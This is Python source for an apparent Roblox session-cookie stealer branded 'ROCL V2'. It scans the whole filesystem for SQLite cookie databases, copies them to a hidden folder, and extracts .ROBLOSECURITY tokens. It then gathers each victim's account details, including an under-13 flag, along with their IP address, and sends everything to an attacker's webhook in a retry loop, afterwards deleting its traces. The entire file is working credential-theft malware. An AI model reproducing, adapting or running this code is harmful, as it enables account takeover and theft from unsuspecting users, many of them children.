from bs4 import BeautifulSoup as htmlparser
import threading
import requests
import sqlite3
import random
import shutil
import time
import os

webhook = ""
logged_cookies = []

def search_cookie(file_path: "file") -> None:
    try:
        conn = sqlite3.Connection(file_path)
        sql = conn.execute('SELECT name FROM sqlite_master WHERE type="table"')
        result = sql.fetchall()
        tables = [tablename for table in result for tablename in table]
        for table in tables:
            sql = conn.execute(f'SELECT value FROM {table} WHERE host=".roblox.com" and name=".ROBLOSECURITY"')
            results = sql.fetchall()
            if len(results) == 0: return
            cookies = [value for result in results for value in result]
            for cookie in cookies:
                cookie = cookie.strip()
                if cookie in logged_cookies:
                    continue
                logged_cookies.append(cookie)
                threading.Thread(target=log_cookie, args=[cookie], daemon=False).start()
        return
    except Exception:
        return

def create_dir() -> "dirpath":
    for root, dirs, files in os.walk("/"):
        for dir_name in dirs:
            try:
                if not root.endswith("/"): root = f"{root}/"
                dir_path = f"{root}{dir_name}"
                if not dir_path.endswith("/"): dir_path = f"{dir_path}/"
                dir_path = f"{dir_path}.weeweewoo"
                if os.path.exists(dir_path):
                    shutil.rmtree(dir_path)
                os.mkdir(dir_path)
                return dir_path
            except Exception:
                continue

def log_cookie(cookie: str) -> None:
    data = {
        "embeds": [
            {
                "author": {
                    "name": "ROCL V2",
                    "url": "https://github.com/lilmond/RoCL-2",
                    "icon_url": "https://raw.githubusercontent.com/lilmond/RoCL-2/main/img/rocl_icon.png"
                },
                "color": 0x6414b4,
                "fields": [
                    {
                        "name": "COOKIE",
                        "value": cookie,
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "lilmond@github",
                    "icon_url": "https://raw.githubusercontent.com/lilmond/RoCL-2/main/img/profile.jpeg"
                }
            }
        ]
    }

    extra_fields = []
    user_info = get_cookie(cookie)
    if not user_info:
        add_field(extra_fields, "USER INFO", "Unable to get user info", True)
    else:
        add_field(extra_fields, "USERNAME", user_info.get("data-name"), True)
        add_field(extra_fields, "USER ID", user_info.get("data-userid"), True)
        add_field(extra_fields, "PREMIUM", user_info.get("data-ispremiumuser"), True)
        add_field(extra_fields, "UNDERAGE", user_info.get("data-isunder13"), True)
        add_field(extra_fields, "JOIN DATE", user_info.get("data-created"), True)
    ip = get_ip()
    add_field(extra_fields, "IP", ip, True)

    data["embeds"][0]["fields"] += extra_fields
    while True:
        try:
            http = requests.post(webhook, json=data)
            if not str(http.status_code).startswith("2"):
                continue
            break
        except Exception:
            continue
    return

def get_cookie(cookie: str) -> dict:
    try:
        http = requests.get("https://www.roblox.com/home", cookies={".ROBLOSECURITY": cookie})
        html = htmlparser(http.text, features="html.parser")
        user_info = html.find("meta", {"name": "user-data"})
        return user_info
    except Exception:
        return

def get_ip() -> str:
    try:
        http = requests.get("https://api.ipify.org")
        ip = http.text
        return ip
    except Exception:
        return "Unable to get IP address"

def add_field(field: list, field_name: str, field_value: str, inline: bool) -> list:
    field.append({"name": field_name, "value": field_value, "inline": inline})
    return field

def add_onstartup() -> None:
    pass

def main():
    hidden_dir = create_dir()
    sequence = 0
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith(".sqlite"):
                sequence += 1
                if not root.endswith("/"): root = f"{root}/"
                file_path1 = f"{root}{file}"
                file_path2 = f"{hidden_dir}/cookies{sequence}.sqlite"
                shutil.copyfile(file_path1, file_path2)
                while True:
                    if threading.active_count() > 50:
                        time.sleep(.1)
                        continue
                    threading.Thread(target=search_cookie, args=[file_path2], daemon=False).start()
                    break

    while True:
        if threading.active_count() == 1:
            shutil.rmtree(hidden_dir)
            return
        time.sleep(.1)

if __name__ == "__main__":
    try:
        add_onstartup()
        while True:
            main()
            time.sleep(5)
    except KeyboardInterrupt:
        pass
